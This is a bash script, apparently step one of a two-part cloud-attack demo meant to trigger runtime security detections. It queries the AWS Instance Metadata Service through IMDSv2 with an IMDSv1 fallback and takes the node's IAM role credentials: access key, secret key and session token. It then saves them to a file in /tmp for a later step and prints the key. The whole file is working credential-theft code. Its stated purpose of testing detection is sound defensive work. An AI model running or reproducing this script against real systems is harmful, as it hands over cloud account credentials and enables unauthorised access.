#!/bin/bash

# ============================================================================
# Cloud Access demo - Step 1 of 2: AWS credential theft via IMDS
# ============================================================================
#
# What this step does:
#   1. Hits the Instance Metadata Service (IMDS) with raw curl calls.
#   2. Retrieves the node's IAM role credentials from IMDS (v2, then v1).
#   3. Prints the stolen credentials and writes them in a temporary file so the
#      follow-up scripts can read them back.

# Define the IMDS endpoint IP
IMDS_IP="169.254.169.254"
IMDS_BASE_URL="http://${IMDS_IP}/latest/meta-data/iam/security-credentials/"


CREDS_FILE="${CLOUD_ACCESS_CREDS_FILE:-/tmp/.aws-cloud-access-creds}"

# Perform raw IMDS credential requests to generate detection signals.
# These direct curl calls hit the IMDS endpoint and are visible to runtime
# security monitoring, independently of whether they succeed or not.

# Retrieve IMDS v1 credentials
curl --connect-timeout 5.0 http://${IMDS_IP}/latest/meta-data/iam/security-credentials/example-role-name || true

# Retrieve IMDS v2 credentials
TOKEN=$(curl --connect-timeout 5.0 -s -X PUT "http://${IMDS_IP}/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") \
    && curl --connect-timeout 5.0 -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://${IMDS_IP}/latest/meta-data/iam/security-credentials/example-role-name || true

# Check for 'jq' dependency
if ! command -v jq &> /dev/null
then
    echo "Error: 'jq' is not installed. Please install it to parse the JSON response." >&2
    exit 1
fi

# Function to retrieve credentials from IMDS
get_imds_credentials() {
    echo "Attempting to retrieve credentials from IMDS..." >&2

    # Try IMDSv2 first
    echo "Trying IMDSv2 ..." >&2
    TOKEN=$(curl -s -X PUT "http://${IMDS_IP}/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --connect-timeout 2 --max-time 5)

    if [ -n "$TOKEN" ]; then
        echo "IMDSv2 token retrieved successfully" >&2
        ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "${IMDS_BASE_URL}" --connect-timeout 2 --max-time 5)

        if [ -n "$ROLE_NAME" ]; then
            echo "Retrieved IAM Role Name: ${ROLE_NAME}" >&2
            CREDENTIALS_JSON=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "${IMDS_BASE_URL}${ROLE_NAME}" --connect-timeout 2 --max-time 5)

            if [ -n "$CREDENTIALS_JSON" ]; then
                export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS_JSON" | jq -r '.AccessKeyId')
                export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS_JSON" | jq -r '.SecretAccessKey')
                export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS_JSON" | jq -r '.Token')
                export AWS_IMDS_ROLE_NAME="$ROLE_NAME"
                echo "Successfully retrieved credentials from IMDSv2" >&2
                return 0
            fi
        fi
    fi

    # Fall back to IMDSv1
    echo "IMDSv2 failed, trying IMDSv1 ..." >&2
    ROLE_NAME=$(curl -s "${IMDS_BASE_URL}" --connect-timeout 2 --max-time 5)

    if [ -n "$ROLE_NAME" ]; then
        echo "Retrieved IAM Role Name: ${ROLE_NAME}" >&2
        CREDENTIALS_JSON=$(curl -s "${IMDS_BASE_URL}${ROLE_NAME}" --connect-timeout 2 --max-time 5)

        if [ -n "$CREDENTIALS_JSON" ]; then
            export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS_JSON" | jq -r '.AccessKeyId')
            export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS_JSON" | jq -r '.SecretAccessKey')
            export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS_JSON" | jq -r '.Token')
            export AWS_IMDS_ROLE_NAME="$ROLE_NAME"
            echo "Successfully retrieved credentials from IMDSv1" >&2
            return 0
        fi
    fi

    echo "Failed to retrieve credentials from IMDS" >&2
    return 1
}

# Try to get credentials from IMDS.
if ! get_imds_credentials; then
    # Fall back to command-line arguments
    if [ $# -eq 3 ]; then
        export AWS_ACCESS_KEY_ID="$1"
        export AWS_SECRET_ACCESS_KEY="$2"
        export AWS_SESSION_TOKEN="$3"
        echo "Using provided AWS credentials from command-line arguments."
    else
        echo "Error: Could not retrieve credentials from IMDS and no valid command-line arguments provided."
        echo "Usage: $0 [AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN]"
        exit 1
    fi
else
    echo "Using credentials from IMDS (Role: ${AWS_IMDS_ROLE_NAME:-unknown})"
fi

# Write the stolen credentials to a file so step 2 can read them back.
cat > "$CREDS_FILE" <<EOF
AWS_ACCESS_KEY_ID='${AWS_ACCESS_KEY_ID}'
AWS_SECRET_ACCESS_KEY='${AWS_SECRET_ACCESS_KEY}'
AWS_SESSION_TOKEN='${AWS_SESSION_TOKEN}'
AWS_IMDS_ROLE_NAME='${AWS_IMDS_ROLE_NAME}'
EOF
chmod 600 "$CREDS_FILE"

# Output the stolen credentials.
echo ""
echo "=== Stolen AWS access key (saved in ${CREDS_FILE}) ==="
echo "AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}"
echo ""
